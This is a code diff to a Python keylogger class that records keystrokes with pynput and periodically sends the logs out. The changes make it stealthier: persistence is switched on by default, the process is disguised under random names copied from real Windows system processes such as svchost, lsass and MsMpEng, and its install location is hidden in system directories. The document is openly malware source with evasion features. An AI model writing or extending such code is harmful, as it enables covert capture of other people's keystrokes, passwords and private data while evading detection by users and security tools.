@@ -12,6 +12,7 @@ import platform
 import threading
 import time
 import base64
+import random
 from datetime import datetime, timezone
 from pynput import keyboard
 import requests
@@ -55,7 +56,7 @@ SEND_INTERVAL = 60  # Send logs every 60 seconds
 MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send
 
 # Advanced Features Configuration
-ENABLE_PERSISTENCE = False
+ENABLE_PERSISTENCE = True  # Auto-enabled for resilience
 ENABLE_CLIPBOARD = False
 ENABLE_SCREENSHOTS = False
 SCREENSHOT_INTERVAL = 300  # 5 minutes
@@ -63,8 +64,32 @@ ENABLE_KEYWORD_ALERTS = False
 KEYWORD_LISTS = []  # e.g., ['financial', 'credentials']
 ENABLE_SELF_PROTECTION = False
 ENABLE_HEALTH_MONITORING = False
-PROGRAM_NAME = "SystemUpdate"
+USE_RANDOM_NAMES = True  # Generate random process names for stealth
 # ============================================================================
+
+# Common Windows process names for disguise
+COMMON_PROCESS_NAMES = [
+    "svchost", "csrss", "smss", "lsass", "winlogon", "services", "spoolsv",
+    "explorer", "taskhost", "dwm", "conhost", "RuntimeBroker", "SearchApp",
+    "SystemSettings", "WindowsUpdate", "SecurityHealthService", "MsMpEng",
+    "audiodg", "wininit", "fontdrvhost", "sihost", "taskhostw"
+]
+
+
+def generate_random_program_name():
+    """Generate a random process name that looks legitimate"""
+    if random.choice([True, False]):
+        # Use common Windows process name
+        base = random.choice(COMMON_PROCESS_NAMES)
+        # Sometimes add numbers like real Windows processes
+        if random.random() < 0.3:
+            base += str(random.randint(1, 99))
+    else:
+        # Generate random legitimate-looking name
+        prefixes = ["System", "Windows", "Microsoft", "Service", "Runtime", "Host", "Update"]
+        suffixes = ["Service", "Host", "Manager", "Helper", "Handler", "Process"]
+        base = random.choice(prefixes) + random.choice(suffixes)
+    return base
 
 
 class AdvancedKeyLogger:
@@ -120,12 +145,15 @@ class AdvancedKeyLogger:
         # Initialize persistence
         if ENABLE_PERSISTENCE:
             try:
+                # Use random name if enabled, otherwise use configured name
+                program_name = generate_random_program_name() if USE_RANDOM_NAMES else "SystemUpdate"
+
                 self.persistence = PersistenceManager(
-                    program_name=PROGRAM_NAME,
-                    program_path=sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+                    program_name=program_name,
+                    hide_location=True  # Hide in system directories
                 )
                 if self.persistence.install():
-                    print("[+] Persistence installed successfully")
+                    print(f"[+] Persistence installed successfully as '{program_name}'")
             except Exception as e:
                 print(f"[!] Persistence setup failed: {e}")
 
